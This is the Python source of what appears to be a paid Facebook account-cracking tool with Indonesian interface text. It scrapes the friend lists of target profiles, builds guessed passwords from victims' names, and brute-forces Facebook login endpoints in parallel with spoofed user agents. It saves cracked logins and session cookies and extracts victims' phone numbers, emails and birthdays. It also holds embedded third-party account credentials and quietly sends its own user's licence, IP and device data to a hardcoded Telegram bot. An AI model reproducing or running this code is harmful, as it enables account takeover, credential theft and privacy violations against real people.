#/usr/bin/python3.11.0
#create by rozhbasxyz

###---[ IMPORT MODULE ]----###
import requests, os, time, datetime, random, re, bs4, sys, platform
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime

###---[ TANGGAL ]---###
xxx = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "Desember", "12": "November"}
hari = datetime.now().day
bulan = xxx[str(datetime.now().month)]
tahun = datetime.now().year
tanggal = f"{hari}-{bulan}-{tahun}"

###---[ USER AGENT ]---###
def ua_rozh():
	rr = random.randint; rc = random.choice; andro = rr(8,13)
	chrome = f"{rr(90,107)}.0.{rr(1111,4500)}.{rr(50,150)}"
	county = rc(["en-gb","en-us","id-id","zh-cn", "en-in"])
	redmi = rc([f"Redmi {rr(3,10)}", f"Redmi {rr(3,10)}A", f"Redmi {rr(3,10)}X", f"Redmi {rr(3,10)} Pro", f"Redmi Note {rr(3,10)}", f"Redmi {rr(3,10)} Note Pro"])
	neo = rc(['NEO-Z64', 'NEO-X8H-PLUS', 'NEO-X88-I', 'NEO-U9-H', 'NEO-U1', 'NEO U22-XJ', 'NEO U22-XJ', 'NEO U22-XJ MAX', 'NEO-X5-116A', 'NEO-X5-mini', 'NEO-X6', 'NEO-X7-mini', 'NEO-X8', 'NEO-X8-PLUS', 'NEO-X8-H'])
	return f"Mozilla/5.0 (Linux; U; Android {andro}; en-US; {neo} Build/PPR1.{rr(111111,999999)}.0{rr(11,99)}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 S40OviBrowser/{chrome}"
#input(ua_rozh())
		
###---[ GLOBAL NAME ]---###
ses = requests.Session()
rr = random.randint
rc = random.choice
ok, cp, loop = 0, 0, 0
dump, dump1 = [], []

###---[ WARNA PRINT ]---###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
C = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
J = '\x1b[38;5;208m' #JINGGA
kod_nam = "leiby.sascha" # RAINBOW
ran_prin = rc([J,U,H])

###---[ CLEAR SCREEN ]---###
def clear_layar():
	try: os.system("clear")
	except: pass
	
###---[ LISENSI ]---###
def lisensi():
	clear_layar()
	logo("user", "-")
	apa = input(f'[{ran_prin}1{P}] masukan lisensi\n[{ran_prin}2{P}] beli lisensi\n[{ran_prin}?{P}] pilih : ')
	if apa in ['1','01']:
		lisen = input(f'[{ran_prin}?{P}] lisen : '); print("─"*39)
		cek_lisen(lisen, "login")
		print(f"[{ran_prin}!{P}] lisensi anda terkonfirmasi")
		open('.apikey.txt','w').write(lisen);back()
	elif apa in ['2','02']:os.system('xdg-open https://wa.me/62859153130120?text=bang+beli+lisensi');exit()
	else:lisensi()

def cek_lisen(lisen, rozhbas):
	hp = platform.platform()
	ses = requests.Session()
	try:
		veri = parser(ses.get("https://app.cryptolens.io/Account/Login").text, "html.parser").find("form",{"method":"post"})
		date = {"__RequestVerificationToken": re.search('name="__RequestVerificationToken" type="hidden" value="(.*?)"',str(veri)).group(1), "UserName": f"{kod_nam}@moondoo.org", "Password": "babasxd", "RememberMe": "true", "submit": "Log In", "next": "https://app.cryptolens.io/Product/Detail/16700"}
		coki = {"cookie": ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])}
		xx = ses.post("https://app.cryptolens.io/Account/Login",data=date, cookies=coki).text
		coki = {"cookie": ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])}
		link = parser(ses.get("https://app.cryptolens.io/Product/Detail/16529",cookies=coki).text, "html.parser")
		key = link.find_all("a",{"class":"serialkey"})
		hari = re.findall("\<td\ id\=\"k-period-.*\"\>(.*?)<\/td\>",str(link))
		exp = re.findall("\<td\ id\=\"k-expr-.*\"\>(.*?)<\/td\>",str(link))
		nama = re.findall('\<a\ href\=\"\/Customer\/Edit\/(.*)\"\ target\=\"\_blank\"\>(.*?)<\/a\>',str(link))
		blok = re.findall('\<a\ href\=\"\#\"\ id\=\"k-bk-.*\"\ onclick\=\".*?\"\ style\=\".*?\"\>\s+(.*?)<\/a\>',str(link))
		data_lisen = {}
		for k,h,e,b,n in zip(key,hari,exp,blok,nama):
			data_lisen.update({f"{k.text}":{"nama":n[1], "id":n[0], "aktif":f"{h} Hari", "sampai":e, "blok":b.replace('                            ','')}})
		try:data = data_lisen[lisen]
		except:data = {"blok": "None"}
		if data["blok"]=="Yes":
			print(f'[{M}!{P}] lisensi anda telah di pakai di perangkat lain')
			time.sleep(2)
			exit(lisensi())
		elif data["blok"]=="None":
			print(f'[{M}!{P}] lisensi anda tidak terdaftar')
			time.sleep(2)
			exit(lisensi())
		nama = data["nama"]
		aktif = data["aktif"]
		y,m,d = data["sampai"].split("-")
		awal = datetime.strptime(f"{d}{m}{y}", "%d%m%Y")
		ahir = datetime.strptime(f"{datetime.now().day}{datetime.now().month}{datetime.now().year}", "%d%m%Y")
		sisa = awal - ahir
		if sisa.days <=0:
			print(f'[{M}!{P}] durasi lisensi anda habis')
			time.sleep(2)
			exit(lisensi())
		xxx = ses.get("https://nordvpn.com/wp-admin/admin-ajax.php?action=get_user_info_data").json()
		data = {"nama": nama, "email": "bladepremium@gmail.com", "join": f"{d}/{m}/{y}", "aktif": sisa.days, "hp": hp, "ip": xxx["ip"], "kota": xxx["city"]}
		pesan = f"lisen    : {lisen}\nnama   : {data['nama']}\nemail   : {data['email']}\njoin      : {data['join']}\nmasa   : {data['aktif']}\nkey hp : {data['hp']}\nip hp    : {data['ip']}\nkota     : {data['kota']}"
		if "login" in str(rozhbas):
			try:ses.post("https://api.telegram.org/bot5529670463:AAELt5ZBWNSq0cMB2IXmQhcJVqLLMEtO5ec/sendMessage", data = {'chat_id':'5016123196','text': pesan})
			except Exception as e: pass
		return nama, sisa.days
	except requests.exceptions.ConnectionError:
		exit(f'[{M}!{P}] tidak ada koneksi internet')
	except Exception as e:
		print(f'[{M}!{P}] lisensi invalid');time.sleep(2);lisensi()

###---[ LOGO ]---###
def logo(user, masa):
	print(f""" ______ ______ _______ _______ 
|   {ran_prin}__{P} \   {ran_prin}__{P} \    {ran_prin}___{P}|   {ran_prin}|{P}   | script
|    __/      <    {ran_prin}___{P}|       | premium
|___|  |___|__|_______|__{ran_prin}|{P}_{ran_prin}|{P}__| version {K}1{P}.
 ______ _____   _______ _____  _______ 
|   {ran_prin}__{P} \     |_|   {ran_prin}_{P}   |     \|    {ran_prin}___{P}|
|   {ran_prin}__{P} <       |       |  {ran_prin}--{P}  |    {ran_prin}___{P}|
|______/_______|___|___|_____/|_______|
selamat datang {K}{user}{P}, aktif {K}{masa}{P} hari lagi.\n{("─"*39)} """)
	
###---[ PUSAT KEMBALI ]---###
def back():
	clear_layar()
	try:
		c = {'cookie': open('.cookie.txt','r').read()}
		t = open('.token.txt','r').read()
		rozh = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
	except Exception as e:login()
	menu(rozh, t, c)
	
###---[ LOGIN WITH COOKIE ]---###
def login():
	clear_layar(); logo("user", "-")
	apa = input(f"[{ran_prin}!{P}] gunakan cookie otomatis [y/n] : ")
	if apa in ["n","n"]:
		x = input(f"[{ran_prin}!{P}] cookie : ")
		ids = re.findall('act=(.*?)&nav_source', ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", cookies={"cookie": x}).text)[0]
		token = re.search('(EAAB\w+)', ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={ids}&nav_source=no_referrer", cookies={"cookie": x}).text).group(1)
		print(f"[{ran_prin}!{P}] cokie  : {H}{x}{P}")
		print(f"[{ran_prin}!{P}] token  : {H}{token}{P}")
		open('.cookie.txt','w').write(x)
		open('.token.txt','w').write(token)
		time.sleep(1.5)
		back()
	print(f"[{ran_prin}!{P}] sedang mencari cookie....")
	try:
		data = parser(ses.get("http://www.facebook.com/100032386028880/posts/674525870303608").content, "html.parser")
		for x in re.findall('"text":"(.*?)"',str(data)):
			if 'datr=' in x or "c_user" in x:
				ids = re.findall('act=(.*?)&nav_source', ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", cookies={"cookie": x}).text)[0]
				token = re.search('(EAAB\w+)', ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={ids}&nav_source=no_referrer", cookies={"cookie": x}).text).group(1)
				print(f"[{ran_prin}!{P}] cokie  : {H}{x}{P}")
				print(f"[{ran_prin}!{P}] token  : {H}{token}{P}")
				open('.cookie.txt','w').write(x)
				open('.token.txt','w').write(token)
				time.sleep(1.5)
				back()
	except: pass
	
###---[ DEF MENU ]---###
def menu(nama, t, c):
	clear_layar()
	try: nama, masa = cek_lisen(open('.apikey.txt', 'r').read(), "")
	except: lisensi()
	logo(nama, masa)
	print(f"[{ran_prin}1{P}] dump publik")
	print(f"[{ran_prin}2{P}] dump masal")
	print(f"[{ran_prin}3{P}] dump file")
	print(f"[{ran_prin}4{P}] cek result")
	print(f"[{ran_prin}5{P}] keluar ({M}cookie{P})")
	opo = input(f"[{ran_prin}?{P}] menu : ")
	print('─'*18)
	if opo in ["1","01"]:
		user = input(f"[{ran_prin}?{P}] akun : ")
		if(re.findall("\w+",user)):akun = convert_id(user)
		else:akun = user
		publik(f"https://mbasic.facebook.com/{akun}/friends", t, c)
	elif opo in ["2","02"]: masal(t, c)
	elif opo in ["4","4"]: cek_hasil()
	elif opo in ["3","03"]: dump_file()
	elif opo in ["link"]:
		link = input(f"[{ran_prin}?{P}] link : ").split("/")[3]
		open("data/login.txt","w").write("/"+link)
		exit(f"[{ran_prin}!{P}] suskes ganti url login")
	elif opo in ["5","05"]: os.system("rm -rf .cookie.txt")
	else: exit(f"[{M}!{P}] pilih antara 1 dan 5")
	
###---[ CONVERT USERNAME ]---###
def convert_id(url):
	if 'https' in url or 'facebook' in url:user = url.split('/')[3]
	else: user = url
	try: uid = re.findall(";rid=(\d+)&amp;",str(ses.get("https://m.facebook.com/"+user).text))[0]
	except: uid = url
	return uid
	
###---[ DUMP FILE ]---###
def dump_file():
	file = input(f"[{ran_prin}!{P}] masukan nama file\n[{ran_prin}?{P}] nama : ")
	try:
		mek = open(file, "r").read().splitlines()
		for x in mek:
			id,pw = x.split("|")
			dump.append(x)
			print(f'\r[{ran_prin}!{P}] dump : %s id'%(len(dump)),end=" ")
			time.sleep(0.0002)
			sys.stdout.flush()
		setting()
	except FileNotFoundError: exit(f"[{M}!{P}] file tidak ada")
	except Exception as e: exit(f"[{M}!{P}] pemisah salah, gunakan | sebagai pemisah")

###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nox,nom = 0,0,[]
	print(f"[{ran_prin}1{P}] cek hasil ok")
	print(f"[{ran_prin}2{P}] cek hasil cp")
	print(f"[{ran_prin}3{P}] batalkan proses")
	one = input(f'[{ran_prin}?{P}] pilih : ')
	print('─'*18)
	if one in ['1','01']:
		try:ok = os.listdir('/sdcard/LITE BLADE')
		except:print(f"[{M}!{P}] tidak hasil");exit()
		for x in ok:
			if 'OK' in str(x):
				nom.append(x)
				no+=1
				try:jum= open('/sdcard/LITE BLADE/'+x,'r').readlines()
				except:continue
				print(f'[{H}{no}{P}] {x} - {H}{len(jum)} {P}akun')	
		abc = input(f'[{ran_prin}?{P}] nomor file : ')
		print('─'*18)
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/LITE BLADE/'+file,'r').read().splitlines()
		except:print(f"[{M}!{P}] file tidak ada hasil ok");exit()
		for data in buka: nox += 1; print(f"[{H}{nox}{P}] {data}")
		exit('─'*18)	
	elif one in ['2','02']:
		try:ok = os.listdir('/sdcard/LITE BLADE')
		except:sys.exit(f"[{M}!{P}] tidak hasil")
		for x in ok:
			if 'CP' in str(x):
				nom.append(x)
				no+=1
				try:jum= open('/sdcard/LITE BLADE/'+x,'r').readlines()
				except:continue
				print(f'[{K}{no}{P}] {x} - {K}{len(jum)} {P}akun')	
		abc = input(f'[{ran_prin}?{P}] nomor file : ')
		print('─'*18)
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/LITE BLADE/'+file,'r').read().splitlines()
		except:print(f"[{M}!{P}] file tidak ada hasil cp");exit()
		for data in buka: nox += 1; print(f"[{K}{nox}{P}] {data}")
		exit('─'*18)	
	else:exit()

###---[ DUMP PUBLIK ]---###
def publik(url, t, c):
	try:
		link = ses.get(url, headers={"Host": "mbasic.facebook.com", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "max-age=0", "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="106"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-model": "", "ch-ua-platform": '"Android"', "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "none", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/72.4.3767.69265", "cookie": c["cookie"]}).text
		data = re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',link)
		for user in data:
			if "profile.php?" in user[0]: pass
			else:
				mentah = re.findall("\/(.*?)\?eav",user[0])[0]+"|"+user[1]
				dump.append(str(mentah))
			print(f'\r[{ran_prin}!{P}] dump : %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
		if "Lihat Teman Lain" in link:
			publik("https://mbasic.facebook.com"+parser(link, "html.parser").find("a", string="Lihat Teman Lain").get("href"), t, c)
	except Exception as e: exit(f"[{M}!{P}] akun tidak publik")
	print(f'\r[{ran_prin}!{P}] dump : %s id'%(len(dump)),end=" "); print("\r")
	setting()

###---[ DUMP MASAL ]---###
def masal(t,c):
	rozh, no = [], 0
	total = input(f"[{ran_prin}?{P}] total : ")
	for x in range(int(total)):
		no += 1
		user = input(f'[{ran_prin}{no}{P}] akun  : ')
		if(re.findall("\w+",user)):akun = convert_id(user)
		else:akun = user
		rozh.append(akun)
	for akun in rozh:
		masal_dump(f"https://mbasic.facebook.com/{akun}/friends", t, c)
	print(f'\r[{ran_prin}!{P}] dump  : %s id'%(len(dump)),end=" ");print("\r")
	setting()

###---[ MAIN MASAL ]---###
def masal_dump(url, t, c):
	try:
		link = ses.get(url, headers={"Host": "mbasic.facebook.com", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "max-age=0", "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="106"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-model": "", "ch-ua-platform": '"Android"', "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "none", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/72.4.3767.69265", "cookie": c["cookie"]}).text
		data = re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',link)
		for user in data:
			if "profile.php?" in user[0]: pass
			else:
				mentah = re.findall("\/(.*?)\?eav",user[0])[0]+"|"+user[1]
				dump.append(str(mentah))
			print(f'\r[{ran_prin}!{P}] dump  : %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
		if "Lihat Teman Lain" in link:
			masal_dump("https://mbasic.facebook.com"+parser(link, "html.parser").find("a", string="Lihat Teman Lain").get("href"), t, c)
	except: pass

###---[ SETTING ]---###
def setting():
	global ok, cp, loop
	tampung = []
	for x in dump: tampung.append(x)
	dump.clear()
	for x in tampung:xx = random.randint(0,len(dump));dump.insert(xx,x)
	print(f"\r{('─'*18)}\n[{ran_prin}1{P}] m.facebook.com        [{ran_prin}4{P}] touch.facebook.com")
	print(f"[{ran_prin}2{P}] mbasic.facebook.com   [{ran_prin}5{P}] x.facebook.com")
	print(f"[{ran_prin}3{P}] free.facebook.com     [{ran_prin}6{P}] p.facebook.com")
	apa = input(f"[{ran_prin}?{P}] pilih : "); print('─'*18)
	if apa in ["1","01"]: url = "m.facebook.com"
	elif apa in ["2","02"]: url = "mbasic.facebook.com"
	elif apa in ["3","03"]: url = "free.facebook.com"
	elif apa in ["4","04"]: url = "touch.facebook.com"
	elif apa in ["5","05"]: url = "x.facebook.com"
	elif apa in ["6","06"]: url = "p.facebook.com"
	else: url = "m.facebook.com"
	print(f"[{ran_prin}!{P}] sandi manual, contoh '{K}rahasia,sayang{P}'")
	manual = input(f"[{ran_prin}?{P}] sandi : ").split(","); print('─'*18)
	print(f"[{ran_prin}!{P}] sandi belakang, contoh '{K}123,12345{P}'")
	belakang = input(f"[{ran_prin}?{P}] sandi : ").split(","); print('─'*18)
	print(f"[{ran_prin}!{P}] hasil ok : OK-{tanggal}.txt")
	print(f"[{ran_prin}!{P}] hasil ok : CP-{tanggal}.txt"); print('─'*18)
	with ThreadPoolExecutor (max_workers=30) as babas:
		for akun in dump:
			user,nama = akun.split('|')[0], akun.split('|')[1].lower()
			dp = nama.split(' ')[0]
			if len(nama)<5: pwx = manual
			else:
				kombo = []
				pwx = [nama.replace(' ',''),nama]+manual
				for x in belakang: kombo.append(str(dp)+str(x))
				pwx = pwx+kombo
			babas.submit(crack, user, pwx, url)
	exit(f"\r[{ran_prin}!{P}] crack selesai dengan jumlah\n[{ran_prin}!{P}] akun ok : {ok}\n[{ran_prin}!{P}] akun cp : {cp}")

###---[ CRACK ]---###			
def crack(user, pwx, url):
	global ok, cp ,loop
	print(f"\r[{ran_prin}!{P}] {loop}/{len(dump)} OK : {ok} CP : {cp}  ",end = ""); sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			ua = ua_rozh()
			base = open("data/login.txt","r").read()
			link = ses.get(f"https://{url}{base}")
			date = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1), "jazoest" :re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1), "email": user, "pass": pw, "next": f"https://{url}/login/save-device/?login_source=login#_=_"}
			head = {"Host": url, "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","origin": f"https://{url}","x-requested-with": "com.facebook.katana","sec-fetch-site": "same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer": link.url, "accept-encoding": "gzip, deflate", "accept-language": "en-GB;q=0.8,en;q=0.7"}
			login = parser(link.text, "html.parser").find("form",{"method":"post"})["action"].split("/")[5]
			bz = ses.post(f"https://{url}/login/device-based/login/async/{login}", data=date, headers=head, allow_redirects=False)
			try: info = re.findall('"m_login_notice":"(.*?)",',str(bz.text))[0]
			except: info = ""
			babas = ses.cookies.get_dict()
			if "c_user" in str(babas): #[{ran_prin}!{P}] usgt  : {ua}\n
				coki = convert_coki(babas)
				print(f"\r[{ran_prin}!{P}] user  : {H}{user}{P}          \n[{ran_prin}!{P}] sandi : {H}{pw}{P}              \n[{ran_prin}!{P}] cokie : {H}{coki}{P}\n{('─'*18)}       ")
				open(f"/sdcard/LITE BLADE/OK-{tanggal}.txt","a").write(f"{user}|{pw}\n")
				ok += 1
				break
			elif "checkpoint" in str(babas):
				print(f"\r[{ran_prin}!{P}] user  : {K}{user}{P}          \n[{ran_prin}!{P}] sandi : {K}{pw}{P}              \n{('─'*18)}          ")
				open(f"/sdcard/LITE BLADE/CP-{tanggal}.txt","a").write(f"{user}|{pw}\n")
				cp += 1
				break
			else: continue
		except requests.exceptions.ConnectionError: time.sleep(10)
		#except Exception as e: print(e)
	loop += 1

###---[ CONVERT COOKIE ]---###
def convert_coki(cok):
	return f"datr={cok['datr']}; sb={cok['sb']}; locale=id_ID; dpr=2; m_pixel_ratio=2; c_user={cok['c_user']}; xs={cok['xs']}; fr={cok['fr']}; wd=360x729"
	
###---[ CEK DATA AKUN ]---###
def cek_data(coki):
	bln = {'01':'Januari', '02':'Februari', '03':'Maret','04':'April','05':'Mei',      '06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober', '11':'November', '12':'Desember'}
	try:
		link = parser(ses.get("https://mbasic.facebook.com/profile.php?v=info&locale=id_ID",cookies={"cookie": coki}).text, "html.parser")
		try:nomor = re.findall('"ltr">(.*?)</',str(link))[0]
		except:nomor = "-"
		try:email = re.findall('"_blank">(.*?)<',str(link))[0]
		except: email = "-"
		try:ultah = " ".join(re.findall('>(\d+) (.*?) (\d+)<',str(link))[0])
		except: ultah = "-"
	except:pass
	try:
		token = re.search('(\["EAAG\w+)', ses.get("https://business.facebook.com/business_locations",cookies={"cookie": coki}).text).group(1).replace('["','')
		link = ses.get(f"https://graph.facebook.com/me/albums?fields=id,name,created_time&limit=1000&access_token={token}",cookies={"cookie": coki})
		t,m,h = [x['created_time'].split('T')[0] for x in link.json()['data'] if x['name']=='Foto Profil'][0].split("-"); b = bln[m]
		tahun = '%s %s %s'%(h,b,t)
	except: tahun = "-"
	return email, nomor, tahun, ultah

#exit(crack("100058841283964",["kebumen"], "m.facebook.com"))

###---[ START ]---###
def main():
	try:os.mkdir("/sdcard/LITE BLADE")
	except:pass
	back()

if __name__ == "__main__":
	try:os.system("git pull")
	except:pass
	main()